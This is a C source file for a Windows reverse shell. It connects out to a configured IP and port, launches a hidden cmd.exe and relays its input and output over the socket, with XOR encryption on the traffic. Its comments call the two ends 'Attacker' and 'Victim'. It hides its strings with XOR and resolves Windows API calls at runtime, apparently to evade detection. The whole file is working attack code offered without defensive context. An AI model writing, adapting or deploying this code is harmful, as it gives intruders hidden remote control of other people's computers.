#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>

/* ================================================== */
/* |     CHANGE THIS TO THE CLIENT IP AND PORT      | */
/* ================================================== */
#if !defined(CLIENT_IP) || !defined(CLIENT_PORT)
# define CLIENT_IP (char*)"0.0.0.0"
# define CLIENT_PORT (int)0
#endif
/* ================================================== */

#define XOR_KEY 0x5A

void xor_crypt(char *data, size_t len) {
    for (size_t i = 0; i < len; i++) {
        data[i] ^= XOR_KEY;
    }
}

// --- Typedefs for Dynamic Loading ---
// WS2_32.dll
typedef int (WSAAPI *lpWSAStartup)(WORD, LPWSADATA);
typedef SOCKET (WSAAPI *lpWSASocketA)(int, int, int, LPWSAPROTOCOL_INFOA, GROUP, DWORD);
typedef int (WSAAPI *lpConnect)(SOCKET, const struct sockaddr *, int);
typedef unsigned long (WSAAPI *lpInet_addr)(const char *);
typedef u_short (WSAAPI *lpHtons)(u_short);
typedef int (WSAAPI *lpRecv)(SOCKET, char *, int, int);
typedef int (WSAAPI *lpSend)(SOCKET, const char *, int, int);
typedef int (WSAAPI *lpIoctlsocket)(SOCKET, long, u_long *);
typedef int (WSAAPI *lpClosesocket)(SOCKET);

// Kernel32.dll
typedef BOOL (WINAPI *lpCreateProcessA)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
typedef void (WINAPI *lpSleep)(DWORD);
typedef BOOL (WINAPI *lpCreatePipe)(PHANDLE, PHANDLE, LPSECURITY_ATTRIBUTES, DWORD);
typedef BOOL (WINAPI *lpReadFile)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
typedef BOOL (WINAPI *lpWriteFile)(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED);
typedef BOOL (WINAPI *lpPeekNamedPipe)(HANDLE, LPVOID, DWORD, LPDWORD, LPDWORD, LPDWORD);
typedef BOOL (WINAPI *lpCloseHandle)(HANDLE);
typedef BOOL (WINAPI *lpSetHandleInformation)(HANDLE, DWORD, DWORD);

int main(int argc, char *argv[]) {
    // Obfuscated Strings
    char cmd_str[] = {0x39, 0x37, 0x3E, 0x00}; // "cmd"
    char ws2_dll[] = {0x2D, 0x29, 0x68, 0x05, 0x69, 0x68, 0x74, 0x3E, 0x36, 0x36, 0x00}; // "ws2_32.dll"
    char k32_dll[] = {0x31, 0x3F, 0x28, 0x34, 0x3F, 0x36, 0x69, 0x68, 0x74, 0x3E, 0x36, 0x36, 0x00}; // "kernel32.dll"

    xor_crypt(cmd_str, 3);
    xor_crypt(ws2_dll, 10);
    xor_crypt(k32_dll, 12);

    HMODULE hWs2 = LoadLibraryA(ws2_dll);
    HMODULE hK32 = GetModuleHandleA(k32_dll); 

    if (!hWs2 || !hK32) return 1;

    // Resolve WS2_32
    lpWSAStartup pWSAStartup = (lpWSAStartup)GetProcAddress(hWs2, "WSAStartup");
    lpWSASocketA pWSASocketA = (lpWSASocketA)GetProcAddress(hWs2, "WSASocketA");
    lpConnect pConnect = (lpConnect)GetProcAddress(hWs2, "connect");
    lpInet_addr pInet_addr = (lpInet_addr)GetProcAddress(hWs2, "inet_addr");
    lpHtons pHtons = (lpHtons)GetProcAddress(hWs2, "htons");
    lpRecv pRecv = (lpRecv)GetProcAddress(hWs2, "recv");
    lpSend pSend = (lpSend)GetProcAddress(hWs2, "send");
    lpIoctlsocket pIoctlsocket = (lpIoctlsocket)GetProcAddress(hWs2, "ioctlsocket");
    lpClosesocket pClosesocket = (lpClosesocket)GetProcAddress(hWs2, "closesocket");

    // Resolve Kernel32
    lpCreateProcessA pCreateProcessA = (lpCreateProcessA)GetProcAddress(hK32, "CreateProcessA");
    lpSleep pSleep = (lpSleep)GetProcAddress(hK32, "Sleep");
    lpCreatePipe pCreatePipe = (lpCreatePipe)GetProcAddress(hK32, "CreatePipe");
    lpReadFile pReadFile = (lpReadFile)GetProcAddress(hK32, "ReadFile");
    lpWriteFile pWriteFile = (lpWriteFile)GetProcAddress(hK32, "WriteFile");
    lpPeekNamedPipe pPeekNamedPipe = (lpPeekNamedPipe)GetProcAddress(hK32, "PeekNamedPipe");
    lpCloseHandle pCloseHandle = (lpCloseHandle)GetProcAddress(hK32, "CloseHandle");
    lpSetHandleInformation pSetHandleInformation = (lpSetHandleInformation)GetProcAddress(hK32, "SetHandleInformation");

    if (!pWSAStartup || !pWSASocketA || !pConnect || !pCreateProcessA || !pCreatePipe) return 1;

    // --- Connection Setup ---
    char *target_ip = CLIENT_IP;
    int target_port = CLIENT_PORT;

    if (argc == 3) {
        target_ip = argv[1];
        target_port = atoi(argv[2]);
    }

    if (strcmp(target_ip, "0.0.0.0") == 0 || target_port == 0) return 1;

    WSADATA wsaData;
    if (pWSAStartup(MAKEWORD(2 ,2), &wsaData) != 0) return 1;

    struct sockaddr_in sa;
    SOCKET sockt = pWSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    sa.sin_family = AF_INET;
    sa.sin_port = pHtons(target_port);
    sa.sin_addr.s_addr = pInet_addr(target_ip);

    if (pConnect(sockt, (struct sockaddr *) &sa, sizeof(sa)) != 0) return 1;

    // --- Pipe Setup ---
    HANDLE hStdInRead, hStdInWrite;
    HANDLE hStdOutRead, hStdOutWrite;
    SECURITY_ATTRIBUTES saAttr;

    saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
    saAttr.bInheritHandle = TRUE;
    saAttr.lpSecurityDescriptor = NULL;

    // Create pipes
    if (!pCreatePipe(&hStdOutRead, &hStdOutWrite, &saAttr, 0)) return 1;
    if (!pCreatePipe(&hStdInRead, &hStdInWrite, &saAttr, 0)) return 1;

    // Ensure the write handle to stdin and read handle to stdout are NOT inherited
    pSetHandleInformation(hStdInWrite, HANDLE_FLAG_INHERIT, 0);
    pSetHandleInformation(hStdOutRead, HANDLE_FLAG_INHERIT, 0);

    // --- Process Creation ---
    STARTUPINFO sinfo;
    PROCESS_INFORMATION pinfo;
    memset(&sinfo, 0, sizeof(sinfo));
    sinfo.cb = sizeof(sinfo);
    sinfo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    sinfo.hStdInput = hStdInRead;
    sinfo.hStdOutput = hStdOutWrite;
    sinfo.hStdError = hStdOutWrite;
    sinfo.wShowWindow = SW_HIDE;

    if (!pCreateProcessA(NULL, cmd_str, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo)) {
        return 1;
    }

    // Close handles we don't need in the parent
    pCloseHandle(hStdOutWrite);
    pCloseHandle(hStdInRead);

    // --- Main Loop (Encryption Proxy) ---
    char buffer[1024];
    DWORD bytesRead, bytesWritten, bytesAvail;
    u_long mode;

    while (1) {
        // 1. Check for incoming data from Socket (Attacker)
        mode = 0;
        if (pIoctlsocket(sockt, FIONREAD, &mode) == 0 && mode > 0) {
            int result = pRecv(sockt, buffer, sizeof(buffer), 0);
            if (result <= 0) break;

            // Decrypt data from attacker
            xor_crypt(buffer, result);

            // Write to cmd.exe's stdin
            pWriteFile(hStdInWrite, buffer, result, &bytesWritten, NULL);
        }

        // 2. Check for outgoing data from Cmd (Victim)
        bytesAvail = 0;
        if (pPeekNamedPipe(hStdOutRead, NULL, 0, NULL, &bytesAvail, NULL) && bytesAvail > 0) {
            if (pReadFile(hStdOutRead, buffer, sizeof(buffer), &bytesRead, NULL) && bytesRead > 0) {
                // Encrypt data from cmd.exe
                xor_crypt(buffer, bytesRead);

                // Send to attacker
                pSend(sockt, buffer, bytesRead, 0);
            } else {
                break;
            }
        }

        // 3. Check if process is still alive
        // (Optional optimization: only check every few seconds)
        
        pSleep(10); // Prevent high CPU usage
    }

    pClosesocket(sockt);
    pCloseHandle(hStdInWrite);
    pCloseHandle(hStdOutRead);
    return 0;
}
